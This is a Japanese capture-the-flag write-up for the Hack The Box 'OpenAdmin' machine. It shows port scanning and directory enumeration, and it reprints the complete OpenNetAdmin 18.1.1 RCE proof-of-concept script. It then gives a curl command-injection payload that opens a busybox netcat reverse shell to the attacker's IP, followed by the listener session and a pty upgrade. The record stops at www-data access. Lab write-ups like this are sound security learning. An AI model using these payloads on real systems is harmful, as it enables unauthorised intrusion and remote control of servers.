https://app.hackthebox.com/machines/OpenAdmin
## STEP 1
```sh
└─$ rustscan -a 10.129.5.45--scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.170.23:22
Open 10.129.170.23:80
10.129.170.23 -> [22,80]

```


## STEP 2
80番にアクセス、Apacheのデフォルトページっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_01.png" width="50%" height="50%">  
列挙、music/artwork を発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.5.45/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.5.45/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4592ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4592ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4593ms]
artwork                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 283ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 304ms]
music                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 299ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 291ms]
:: Progress: [4744/4744] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
```
musicのログインページから、列挙で見つけれなかったサイトを発見  
OpenNetAdminというやつが使われているっぽい
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/OpenAdmin_02.png" width="75%" height="75%">  



## STEP 3
opennetadmin 18.1.1 には CVE-2019-25065 が存在しRCEの脆弱性がある  
searchsploitで、PoCを発見
```sh
└─$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/htb/47691.sh
```
PoCの使い方はURLを引数にする必要あり  
ただリバースシェルをとるのではなく毎度コマンドをRCEで実行しているぽい、手動でエクスプロイト
```sh
└─$ cat 47691.sh                                                   
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
PoCのcurlをぱくって、RCE
```sh
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";busybox nc 10.10.14.70 4444 -e /bin/bash;echo \"END\"&xajaxargs[]=ping" http://10.129.5.45/ona/login.php 
^C
```
無事リバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.5.45] 32810

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

tty
not a tty

python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$

www-data@openadmin:/opt/ona/www$ tty
tty
/dev/pts/1
```
